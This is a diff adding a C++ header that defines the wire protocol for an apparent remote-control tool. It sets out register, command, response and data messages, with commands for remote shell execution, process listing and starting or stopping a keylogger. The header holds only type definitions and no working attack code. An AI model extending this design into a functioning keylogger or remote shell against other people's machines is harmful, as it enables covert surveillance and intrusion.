@@ -1,0 +1,95 @@
+#ifndef LPTF_PROTOCOL
+#define LPTF_PROTOCOL
+
+#include <cstdint>  
+#include <string>
+
+constexpr uint8_t LPTF_VERSION = 1;
+constexpr uint8_t LPTF_HEADER_SIZE = 8;
+constexpr char LPTF_IDENTIFIER[4] = {'L', 'P', 'T', 'F'};
+constexpr std::string_view LPTF_IDENTIFIER_STR(LPTF_IDENTIFIER, 4);
+
+enum class MessageType : uint8_t {
+    REGISTER = 0,
+    DATA = 1,
+    COMMAND = 2,
+    RESPONSE = 3,
+    DISCONNECT = 4,
+    ERROR // must always be the last !!
+};
+
+enum class CommandType : uint8_t {
+    OS_INFO = 0,
+    RUNNING_PROCESSES = 1,
+    SHELL = 2,
+    START_KEYLOGGER = 3,
+    STOP_KEYLOGGER = 4,
+};
+
+enum class DataType : uint8_t {
+    KEYLOGGER = 0,
+};
+
+enum class ErrorType : uint8_t {
+    UNKNOWN_TYPE = 0,
+    INVALID_FORMAT = 1,
+    UNKNOWN_COMMAND = 2,
+    EXECUTION_FAILED = 3,
+    SIZE_EXCEEDED = 4,
+};
+
+enum class OSType : uint8_t {
+    WINDOWS = 0,
+    LINUX = 1,
+    MAC = 2,
+};
+
+enum class ArchType : uint8_t {
+    X86 = 0,
+    X64 = 1,
+    ARM = 2,
+};
+
+enum class ResponseStatus : uint8_t {
+    OK = 0,
+    ERROR = 1,
+};
+
+struct LptfHeader {
+    char identifier[4];
+    uint8_t version;
+    MessageType type;
+    uint16_t size;
+};
+
+struct RegisterPayload {
+    OSType os_type;
+    ArchType arch;
+    std::string hostname;
+};
+
+struct CommandPayload {
+    uint16_t id;
+    CommandType type;
+    std::string data;
+};
+
+struct ResponsePayload {
+    uint16_t id;         
+    ResponseStatus status;      
+    uint8_t total_chunks; 
+    uint8_t chunk_index;  
+    std::string data;
+};
+
+struct DataPayload {
+    DataType subtype;       
+    std::string data;
+};
+
+struct ErrorPayload {
+    ErrorType code;          
+    std::string message;
+};
+
+#endif
